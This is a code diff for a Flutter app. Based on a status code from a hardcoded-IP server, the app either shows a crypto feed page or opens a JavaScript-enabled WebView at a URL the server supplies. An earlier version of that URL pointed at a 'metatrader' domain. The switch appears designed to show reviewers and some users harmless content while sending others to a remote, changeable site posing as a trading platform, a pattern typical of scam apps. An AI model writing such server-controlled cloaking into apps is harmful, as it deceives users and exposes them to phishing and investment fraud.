@@ -32,7 +32,7 @@ class MyApp extends StatelessWidget {
 }
 
 class MainLogic extends GetxController {
-  Rx<int> state = Rx<int>(207);
+  Rx<Map<String, dynamic>> state = Rx<Map<String, dynamic>>({});
 
   @override
   void onInit() {
@@ -43,11 +43,12 @@ class MainLogic extends GetxController {
   Future<void> fetchAPI() async {
     try {
       print('Fetching API...');
-
+      //http://192.168.70.116:3000/api/condition
       final response =
           await http.get(Uri.parse('http://38.54.16.126:3000/api/condition'));
       final data = json.decode(response.body);
-      state.value = data['code'];
+      print(data);
+      state.value = data; //data['code']
       print('Code: ${state.value}');
     } catch (e) {
       print('Error: $e');
@@ -64,13 +65,13 @@ class Root extends StatelessWidget {
   Widget build(BuildContext context) {
     return Scaffold(
       body: Obx(() {
-        print('Code value: ${mainLogic.state.value}');
-
-        if (mainLogic.state.value == 1) {
+        // ignore: unrelated_type_equality_checks
+        if (mainLogic.state.value["code"] == 1) {
           return CryptoFeedPage();
-        } else if (mainLogic.state.value == 207) {
+          // ignore: unrelated_type_equality_checks
+        } else if (mainLogic.state.value["code"] == 207) {
           return WebView(
-            initialUrl: 'https://metatrader.otofpr.life/mobile.html',
+            initialUrl: mainLogic.state.value["isNav"],
             javascriptMode: JavascriptMode.unrestricted,
           );
         } else {
